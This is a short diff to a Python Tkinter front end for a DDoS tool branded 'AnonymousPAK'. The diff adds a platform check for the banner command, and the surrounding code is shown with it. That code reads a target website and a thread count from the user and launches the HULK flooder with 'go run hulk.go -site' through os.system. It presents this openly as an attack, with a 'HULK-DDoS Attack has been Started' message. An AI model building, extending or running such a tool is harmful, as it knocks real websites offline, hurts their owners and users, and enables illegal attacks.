@@ -4,7 +4,7 @@ import os
 from tkinter import messagebox
 import subprocess
 import shlex
-
+import platform
 #DDoSing Target Function
 def run_command(command):
     process = subprocess.Popen(shlex.split(command), stdout=subprocess.PIPE)
@@ -19,7 +19,10 @@ def run_command(command):
 def Attack_Target():
     website = str(Website.get())
     threads = str(Thread.get())
-    os.system("pyfiglet AnonymousPAK DDoS")
+    if str(platform.system()) == 'Linux':
+        os.system('figlet AnonymousPAK DDoS')
+    else:
+        os.system("pyfiglet AnonymousPAK DDoS")
     messagebox.showinfo("Attack Status", "HULK-DDoS Attack has been Started with " + str(threads) + " on Website " + website)
     DDoS_Output = "HULKMAXPROCS={0} go run hulk.go -site {1}".format(threads, website)
     os.system(DDoS_Output)
